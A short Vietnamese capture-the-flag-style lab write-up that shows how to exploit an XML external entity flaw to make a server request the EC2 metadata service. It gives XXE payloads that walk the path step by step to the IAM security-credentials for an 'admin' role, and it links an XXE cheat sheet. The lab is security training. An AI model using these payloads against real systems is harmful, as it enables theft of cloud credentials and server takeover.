## Exploiting XXE to perform SSRF attacks

> Mục đích của Lab là muốn chúng tận dụng khai thác lỗi hổng XXE tấn công ssrf lấy được IAM secret key của server ec2

Vẫn bắt lại request như Lab1, nhưng chúng ta sẽ trỏ tới server như description của Lab.

![](/imgs/XXE/7.png?raw=true)

Request trả về là không biết id là lastest (có thể đây là path chưa đúng)

Tiếp tục gửi tới 

```XML
<!DOCTYPE test [ <!ENTITY test SYSTEM "http://169.254.169.254/latest"> ]> 
```

chúng ta sẽ nhận được

![](/imgs/XXE/8.png?raw=true)

Vẫn thiếu, ta sẽ thêm tiếp ***meta-data*** vào path và cứ lặp lại cho tới khi nào lấy được dữ liệu cuối cùng.

```XML
<!DOCTYPE test [ <!ENTITY test SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
```

![](/imgs/XXE/9.png?raw=true)
![](/imgs/XXE/10.png?raw=true)

### Tài Liệu Tham Khảo
- Một số CheatSheet: [https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)